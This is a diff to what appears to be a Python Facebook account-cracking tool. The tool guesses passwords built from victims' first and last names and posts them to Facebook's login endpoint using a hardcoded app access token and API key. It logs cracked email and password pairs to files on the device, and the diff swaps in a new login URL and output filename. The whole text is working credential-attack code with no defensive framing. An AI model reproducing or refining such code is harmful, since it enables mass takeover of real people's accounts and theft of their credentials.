@@ -488,7 +488,7 @@ def andom():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1', cookies=cookies, headers=headers)
+            response = r.post('https://x.facebook.com/auth/login', cookies=cookies, headers=headers)
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mR4FSAN-FILE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
@@ -510,7 +510,7 @@ def andom():
                 else:
                      print('\r\033[1;91m[\033[1;97mR4FSAN-FILE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/R4FSAN-FILE-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
